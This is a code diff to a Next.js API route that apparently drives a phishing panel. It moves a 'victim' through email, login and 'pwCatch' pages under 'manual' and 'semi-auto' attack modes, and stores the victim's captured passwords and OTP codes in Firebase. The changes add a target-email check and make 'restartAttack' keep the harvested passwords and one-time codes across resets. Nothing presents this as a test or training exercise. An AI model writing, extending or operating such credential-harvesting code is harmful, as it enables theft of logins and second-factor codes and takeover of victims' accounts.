@@ -50,7 +50,7 @@ export async function GET(request: NextRequest) {
     }
 
     if (view === 'victim') {
-       if (appState.config.attackMode === 'manual' && appState.victim.currentPage === 'email') {
+       if (appState.config.attackMode === 'manual' && appState.victim.currentPage === 'email' && appState.config.targetEmail) {
          const manualStartState = {
             ...appState.victim,
             currentPage: 'login' as const,
@@ -63,7 +63,7 @@ export async function GET(request: NextRequest) {
             ...manualStartState,
             redirectUrl: appState.config.redirectUrl,
          });
-       } else if (appState.config.attackMode === 'semi-auto' && appState.victim.currentPage === 'email') {
+       } else if (appState.config.attackMode === 'semi-auto' && appState.victim.currentPage === 'email' && appState.config.targetEmail) {
          const semiAutoStartState = {
             ...appState.victim,
             currentPage: 'pwCatch' as const,
@@ -210,24 +210,17 @@ export async function POST(request: NextRequest) {
       
       case 'restartAttack': {
         const victimRef = ref(db, 'victim');
-        const victimSnapshot = await get(victimRef);
-        if (victimSnapshot.exists()) {
-            const victimData = victimSnapshot.val();
-            const updateData = {
-                ...victimData,
-                currentPage: 'email',
-                attempts: 0,
-                errorMessage: '',
-                isTyping: false
-            };
-            // Do not clear email, name, profilePicture, passwords, or otp
-            await set(victimRef, updateData);
-        } else {
-            // If no victim data, just set to initial state
-            await set(ref(db, 'victim'), initialState.victim);
-        }
+        // Reset only specific fields, preserving passwords and other data.
+        const resetData = {
+          ...initialState.victim, // Start with a clean slate
+          // Now, carry over the data we want to keep
+          passwords: (await get(ref(db, 'victim/passwords'))).val() || {},
+          otp: (await get(ref(db, 'victim/otp'))).val() || '',
+        };
+        await set(victimRef, resetData);
         return NextResponse.json({ success: true, message: 'Attack restarted' });
       }
+
 
       case 'clearVictimData':
         await set(ref(db, 'victim'), initialState.victim);
